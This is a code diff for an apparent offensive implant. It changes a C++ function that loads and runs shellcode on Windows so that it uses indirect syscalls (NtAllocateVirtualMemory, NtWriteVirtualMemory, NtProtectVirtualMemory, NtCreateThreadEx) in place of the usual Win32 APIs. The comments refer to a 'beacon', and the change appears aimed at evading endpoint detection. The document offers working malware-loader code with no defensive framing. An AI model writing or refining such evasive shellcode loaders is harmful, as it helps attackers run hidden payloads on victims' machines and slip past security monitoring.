@@ -23,29 +23,38 @@
 
 namespace inmemory {
 
+#include "syscalls.h"
+
 #ifdef _WIN32
-// Execute Shellcode on Windows
+// Execute Shellcode on Windows using Indirect Syscalls
 inline bool run_shellcode(const std::vector<unsigned char>& shellcode) {
     if (shellcode.empty()) return false;
 
-    LPVOID pMemory = VirtualAlloc(nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pMemory) return false;
+    PVOID pMemory = nullptr;
+    SIZE_T size = shellcode.size();
+    
+    // NtAllocateVirtualMemory
+    if (syscalls::SysNtAllocateVirtualMemory(GetCurrentProcess(), &pMemory, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
+        return false;
+    }
 
-    RtlMoveMemory(pMemory, shellcode.data(), shellcode.size());
+    // NtWriteVirtualMemory (using PEB fallback)
+    if (syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pMemory, (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
+        // We should free memory here
+        return false;
+    }
 
     DWORD oldProtect;
-    if (!VirtualProtect(pMemory, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
-        VirtualFree(pMemory, 0, MEM_RELEASE);
+    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pMemory, &size, PAGE_EXECUTE_READ, &oldProtect) != 0) {
         return false;
     }
 
-    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)pMemory, nullptr, 0, nullptr);
-    if (!hThread) {
-        VirtualFree(pMemory, 0, MEM_RELEASE);
+    // NtCreateThreadEx
+    HANDLE hThread = NULL;
+    if (syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PVOID)pMemory, NULL, FALSE, 0, 0, 0, NULL) != 0) {
         return false;
     }
 
-    // We don't wait for the thread here so the beacon remains responsive
     CloseHandle(hThread);
     return true;
 }
